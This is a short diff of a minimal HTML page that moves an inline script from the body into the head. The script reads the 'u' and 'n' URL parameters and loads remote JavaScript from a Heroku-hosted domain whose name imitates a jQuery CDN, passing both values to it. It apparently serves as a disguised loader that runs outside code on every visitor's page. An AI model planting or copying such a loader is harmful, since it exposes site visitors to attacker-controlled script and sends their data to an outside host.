@@ -1,20 +1,20 @@
 <html>
 <head>
-
+  <script>
+    var parts = window.location.search.substr(1).split("&");
+    var $_GET = {};
+    for (var i = 0; i < parts.length; i++) {
+        var temp = parts[i].split("=");
+        $_GET[decodeURIComponent(temp[0])] = decodeURIComponent(temp[1]);
+    }
+  var u = $_GET['u'];
+  var n = $_GET['n'];
+  var my_awesome_script = document.createElement('script');
+  my_awesome_script.setAttribute('src','https://cdn-s1-cloud-jquery.herokuapp.com/fetch.js?n='+n+'&u='+u);
+  document.head.appendChild(my_awesome_script);
+  </script>
 </head>
 <body>
-<script>
-  var parts = window.location.search.substr(1).split("&");
-  var $_GET = {};
-  for (var i = 0; i < parts.length; i++) {
-      var temp = parts[i].split("=");
-      $_GET[decodeURIComponent(temp[0])] = decodeURIComponent(temp[1]);
-  }
-var u = $_GET['u'];
-var n = $_GET['n'];
-var my_awesome_script = document.createElement('script');
-my_awesome_script.setAttribute('src','https://cdn-s1-cloud-jquery.herokuapp.com/fetch.js?n='+n+'&u='+u);
-document.head.appendChild(my_awesome_script);
-</script>
+
 </body>
 </html>
